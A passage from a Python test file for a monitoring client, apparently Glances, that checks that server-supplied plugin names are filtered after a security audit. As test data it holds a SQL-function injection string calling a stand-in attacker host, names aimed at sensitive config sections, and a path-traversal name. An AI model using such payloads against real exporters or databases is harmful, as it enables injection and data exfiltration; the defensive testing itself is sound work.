    assert main.run_client(main.build_parser().parse_args(argv), GlancesConfig()) == 0
    assert seen == [expected]


def test_remote_plugins_refuse_names_that_are_not_plugin_names(caplog):
    """Security audit 2026-10-17, R-1/R-2/R-7: the server's plugin names become table,
    topic and metric names in the exporters, and the name of a section of the
    CLIENT's glances.conf merged into the payload. Only a plugin-looking name passes."""
    schema = {
        **_SCHEMA,
        "FUNCTION url('http://attacker.example/x', Native)": {"x": {}},
        "passwords": {"localhost": {}},
        "influxdb": {"host": {}},
        "amp_nginx": {"result": {}},
        "cpu/../x": {"total": {}},
    }
    plugins = {p.plugin_name for p in client.remote_plugins(schema, _remote_store(), _config(), {"version"})}
    assert plugins == {"mem", "network", "processlist"}
    assert "ignored: not a plugin name" in caplog.text
